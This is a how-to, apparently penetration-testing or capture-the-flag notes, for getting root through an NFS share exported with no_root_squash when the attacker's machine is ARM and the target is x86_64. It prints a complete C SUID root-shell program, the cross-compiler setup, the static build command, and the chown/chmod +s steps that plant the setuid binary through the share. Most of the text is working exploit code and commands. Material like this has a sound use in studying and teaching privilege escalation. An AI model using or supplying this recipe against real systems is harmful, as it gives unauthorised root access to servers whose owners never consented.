# Documentation: Cross-Architecture Privilege Escalation (NFS)

## 1. Problem Statement: Architecture Mismatch

When exploiting systems via an NFS vulnerability (`no_root_squash`), we need to create a binary file with SUID root privileges from the attacker's machine and run it on the target machine. However, a common issue is an architecture mismatch:
- **Attacker Machine**: Uses ARM64 / aarch64 architecture (e.g., Mac M1/M2/M3 or Kali ARM).
- **Target Machine**: Uses x86_64 / amd64 architecture (e.g., Intel/AMD Server).

If compiled with the standard `gcc` command, the resulting file will be an ARM binary that cannot run on x86_64, resulting in errors like:
- `-sh: ./pwn: Exec format error`
- `-sh: ./pwn: not found`

## 2. The Exploit Code (C Language)

The C script used for escalating privileges to Root by enforcing the system to run Bash with maximum privileges:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(0); // Set User ID to root (0)
    setgid(0); // Set Group ID to root (0)
    system("/bin/bash -p"); // Run Bash in Privileged mode to maintain root privileges
    return (0);
}
```

## 3. Solution: Cross-Compilation Workflow

When architectures do not match, we need to use a Cross-Compiler tool to create binaries for another system from our own machine.

### Step A: Environment Setup

Install the necessary Library and Compiler for x86_64 on the ARM machine (e.g., Kali Linux):

```bash
# Install the Standard C Library for x86_64
sudo apt update && sudo apt install libc6-dev-amd64-cross -y

# Install the Cross-compiler
sudo apt install gcc-x86-64-linux-gnu -y
```

### Step B: Compiling the Binary

Normal compilation might create a Shared Object file, which could cause library dependency issues on the target machine. Using the `-static` flag integrates all required libraries into a single executable, ensuring it runs reliably (Portable):

```bash
# Compile statically for maximum stability
x86_64-linux-gnu-gcc -static privi.c -o pwn_static
```

### Step C: Verifying the Binary

Ensure that the resulting file is indeed compiled for x86-64 and not aarch64:

```bash
file pwn_static

# Expected output: ELF 64-bit LSB executable, x86-64, statically linked...
```

## 4. Permission Setting (NFS Exploit)

After obtaining the binary with the correct architecture, we must assign SUID privileges through the NFS vulnerability. Perform this on the Attacker machine within the mounted directory:

```bash
# Change the owner to root
sudo chown root:root pwn_static

# Set the SUID Bit ('s') to allow other users to gain root privileges upon execution
sudo chmod +s pwn_static
```

## 5. Summary Table: Commands & Roles

| Command | Purpose |
|---------|---------|
| `uname -m` | Check the current machine's CPU architecture. |
| `file <file>` | Identify the architecture a binary was compiled for. |
| `x86_64-linux-gnu-gcc` | The compiler used to create x86_64 binaries from an ARM/other machine. |
| `-static` | A compilation flag that bundles all necessary libraries into the binary, preventing runtime errors. |
| `chmod +s` | Set the SUID bit to allow privilege escalation. |
